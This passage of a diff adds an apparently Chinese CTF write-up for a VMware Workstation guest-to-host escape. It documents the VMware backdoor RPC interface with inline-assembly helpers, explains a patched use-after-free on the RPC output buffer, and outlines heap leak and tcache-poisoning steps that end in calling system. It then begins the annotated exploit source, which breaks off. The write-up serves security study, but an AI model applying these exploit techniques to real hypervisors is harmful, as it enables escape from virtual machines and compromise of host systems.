+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+
+<p>返回值:</p>
+<div class="codehilite"><pre><span></span><span class="n">ECX</span> <span class="o">=</span> <span class="mo">000010000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+
+<p>该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令<code>machine.id.get</code>，那么必须要调用4次，分别为：</p>
+<p><div class="codehilite"><pre><span></span><span class="n">EBX</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">6863616</span><span class="n">Dh</span> <span class="p">(</span><span class="s">&quot;mach&quot;</span><span class="p">)</span>
+<span class="n">EBX</span> <span class="n">set</span> <span class="n">to</span> <span class="mf">2E656</span><span class="n">E69h</span> <span class="p">(</span><span class="s">&quot;ine.&quot;</span><span class="p">)</span>
+<span class="n">EBX</span> <span class="n">set</span> <span class="n">to</span> <span class="mf">672E6469</span><span class="n">h</span> <span class="p">(</span><span class="s">&quot;id.g&quot;</span><span class="p">)</span>
+<span class="n">EBX</span> <span class="n">set</span> <span class="n">to</span> <span class="mo">00007465</span><span class="n">h</span> <span class="p">(</span><span class="s">&quot;et</span><span class="se">\x00\x00</span><span class="s">&quot;</span><span class="p">)</span>
+</pre></div>
+ECX会返回是否成功，具体实现如下：</p>
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_send_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;pushq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%r9,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $0,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;1:</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;add %%r12,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl (%%rbp),%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0002001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;addq $4,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;cmpq %%r12,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;ja 1b</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;popq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<h3 id="recieve-rpc-reply-length">Recieve RPC reply length<a class="headerlink" href="#recieve-rpc-reply-length" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：03h</p>
+</blockquote>
+<p>调用：
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0003</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+返回值：
+<div class="codehilite"><pre><span></span><span class="n">EBX</span> <span class="o">=</span> <span class="n">reply</span> <span class="n">length</span> <span class="p">(</span><span class="n">not</span> <span class="n">including</span> <span class="n">the</span> <span class="n">terminating</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="n">ECX</span> <span class="o">=</span> <span class="mo">00</span><span class="mi">830000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中<code>1</code>表示<code>success</code>,<code>0</code>表示<code>failure</code>，即使VMware无法识别RPC command，也会返回<code>0 Unknown command</code>作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_recv_reply_len</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">len</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%r8,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0003001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ebx,(%%r11)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span>
+        <span class="p">);</span>
+
+<span class="p">}</span>
+</pre></div></p>
+<h3 id="receive-rpc-reply-data">Receive RPC reply data<a class="headerlink" href="#receive-rpc-reply-data" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：04h</p>
+</blockquote>
+<p>调用：
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">EBX</span> <span class="o">=</span> <span class="n">reply</span> <span class="n">type</span> <span class="n">from</span> <span class="n">subcommand</span> <span class="mo">03</span><span class="n">h</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0004</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+返回：
+<div class="codehilite"><pre><span></span><span class="n">EBX</span> <span class="o">=</span> <span class="mi">4</span> <span class="n">bytes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">reply</span> <span class="n">data</span> <span class="p">(</span><span class="n">the</span> <span class="n">first</span> <span class="n">byte</span> <span class="n">in</span> <span class="n">LSB</span><span class="p">)</span>
+<span class="n">ECX</span> <span class="o">=</span> <span class="mo">00010000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+和<code>https://sites.google.com/site/chitchatvmback/backdoor</code>中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在<code>Recieve RPC reply length</code>中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问<code>machine.id.get</code>，如果成功的话，会返回<code>1 &lt;virtual machine id&gt;</code>，否则为<code>0 No machine id</code>。
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_recv_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">offset</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;pushq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%r9,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%r8,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rcx,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq $1,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0004001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;in %%dx,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;add %%r11,%%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ebx,(%%rbp)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;popq %%rbp</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div></p>
+<h3 id="finish-receiving-rpc-reply">Finish receiving RPC reply<a class="headerlink" href="#finish-receiving-rpc-reply" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：05h</p>
+</blockquote>
+<p>调用：
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">EBX</span> <span class="o">=</span> <span class="n">reply</span> <span class="n">type</span> <span class="n">from</span> <span class="n">subcommand</span> <span class="mo">03</span><span class="n">h</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0005</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+返回：
+<div class="codehilite"><pre><span></span><span class="n">ECX</span> <span class="o">=</span> <span class="mo">00010000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过<code>Receive RPC reply data</code>接收完整个reply数据的话，就会返回failure。
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_recv_finish</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq $0x1,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0005001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div></p>
+<h3 id="close-rpc-channel">Close RPC channel<a class="headerlink" href="#close-rpc-channel" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>RPC subcommand：06h</p>
+</blockquote>
+<p>调用：
+<div class="codehilite"><pre><span></span><span class="n">EAX</span> <span class="o">=</span> <span class="mi">564</span><span class="n">D5868h</span> <span class="o">-</span> <span class="n">magic</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="mo">0006</span><span class="n">h</span> <span class="o">-</span> <span class="n">subcommand</span> <span class="n">number</span>
+<span class="n">ECX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mo">001</span><span class="n">Eh</span> <span class="o">-</span> <span class="n">command</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">HI</span><span class="p">)</span> <span class="o">=</span> <span class="n">channel</span> <span class="n">number</span>
+<span class="n">EDX</span><span class="p">(</span><span class="n">LO</span><span class="p">)</span> <span class="o">=</span> <span class="mi">5658</span><span class="n">h</span> <span class="o">-</span> <span class="n">port</span> <span class="n">number</span>
+</pre></div>
+返回：
+<div class="codehilite"><pre><span></span><span class="n">ECX</span> <span class="o">=</span> <span class="mo">00010000</span><span class="nl">h</span><span class="p">:</span> <span class="n">success</span> <span class="o">/</span> <span class="mo">00000000</span><span class="nl">h</span><span class="p">:</span> <span class="n">failure</span>
+</pre></div>
+关闭channel。
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_close</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0006001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div></p>
+<h2 id="_2">漏洞分析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。
+<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/MKWqK97.png" />
+可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：
+<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/babk4SB.png" />
+首先在0x1893c9处，channel-&gt;out_msg_buf置null的操作被nop掉了：
+<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/npSiUHz.png" />
+其次在0x1893e6处的函数调用中，v7&amp;1变成了v7&amp;0x21：
+<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/MGjbs9N.png" />
+在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&amp;0x1)变成了&amp;0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的<code>v6</code>这个调用(它会call函数<code>sub_177700</code>)，<code>output buffer</code>被<code>free</code>掉。</p>
+<p><img alt="" src="https://i.ibb.co/ZHVgstf/rwctf2.png" /></p>
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">channel_recv_finish2</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+        <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq %%rcx,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movq $0x21,%%rbx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl $0x0005001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+                <span class="o">:</span>
+                <span class="o">:</span>
+                <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<h2 id="_3">漏洞利用<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>由上面的分析可以知，这个patch会导致<code>UAF</code>:如果我们在接收完成之后设置了<code>0x20</code>这个位，那么<code>output buffer</code>就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它<code>free</code>掉。有了这些条件，我们要完成整个利用就不难了。</p>
+<p>利用步骤如下:
+<code>Leak:</code>
+1. 开两个<code>channel:A，B</code>
+2. <code>A</code>的<code>output buffer</code>为<code>buf_A</code>,然后<code>A</code>释放<code>buf_A</code>
+3. 这时让<code>B</code>准备给<code>guest</code>发<code>output</code>,<code>B</code>会分配一个<code>buffer</code>，我们利用<code>info-set</code>和<code>info-get</code>来控制我们分配的<code>buffer</code>大小，使得<code>B</code>的<code>output buffer: buf_B=buf_A</code>。
+4. <code>A</code>再次释放<code>buf_A</code>，这也导致了<code>buf_B</code>被释放。这个时候我们就可以<code>leak</code>出<code>buf_B</code>的<code>fd</code>了,但是这个指针没有什么用，我们想要的是<code>text base</code>。
+5. 因此我们再执行命令<code>vmx.capability.dnd_version</code>,这会让<code>host</code>分配一块内存来存放一个<code>obj</code>,通过控制<code>buffer</code>大小我们可以刚好让<code>buf_B</code>被用来存放一个<code>obj</code>。而这个<code>obj</code>里面有<code>vtable</code>,我们可以<code>leak</code>出来计算<code>text base</code>。注意我们一直没有接受<code>B</code>的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成<code>leak</code></p>
+<p><code>Exploit</code></p>
+<p>有了<code>leak</code>的方法，<code>exploit</code>的也是类似的了。简单来说就是<code>UAF</code>，把<code>tcache</code>的<code>fd</code>改到<code>bss</code>段，然后改函数指针为<code>system</code>,最后弹<code>calculator</code></p>
+<p>我给作者的exp加上了注释，大家可以参考:
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">channel_open</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rdi,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rsi,%%r11</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rdx,%%r12</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%rcx,%%r13</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0xc9435052,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x1e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x5658,%%edx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%edi,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%esi,(%%r11)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%edx,(%%r12)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r13)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
+        <span class="o">:</span><span class="s">&quot;%rax&quot;</span><span class="p">,</span><span class="s">&quot;%rbx&quot;</span><span class="p">,</span><span class="s">&quot;%rcx&quot;</span><span class="p">,</span><span class="s">&quot;%rdx&quot;</span><span class="p">,</span><span class="s">&quot;%rsi&quot;</span><span class="p">,</span><span class="s">&quot;%rdi&quot;</span><span class="p">,</span><span class="s">&quot;%r8&quot;</span><span class="p">,</span><span class="s">&quot;%r10&quot;</span><span class="p">,</span><span class="s">&quot;%r11&quot;</span><span class="p">,</span><span class="s">&quot;%r12&quot;</span><span class="p">,</span><span class="s">&quot;%r13&quot;</span>
+       <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">channel_set_len</span><span class="p">(</span><span class="kt">int</span> <span class="n">cookie1</span><span class="p">,</span><span class="kt">int</span> <span class="n">cookie2</span><span class="p">,</span><span class="kt">int</span> <span class="n">channel_num</span><span class="p">,</span><span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="kt">int</span> <span class="o">*</span><span class="n">res</span><span class="p">){</span>
+    <span class="k">asm</span><span class="p">(</span><span class="s">&quot;movl %%eax,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movq %%r8,%%r10</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,%%ebx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x564d5868,%%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl $0x0001001e,%%ecx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movw $0x5658,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;out %%eax,%%dx</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="s">&quot;movl %%ecx,(%%r10)</span><span class="se">\n\t</span><span class="s">&quot;</span>
+        <span class="o">:</span>
+        <span class="o">:</span>
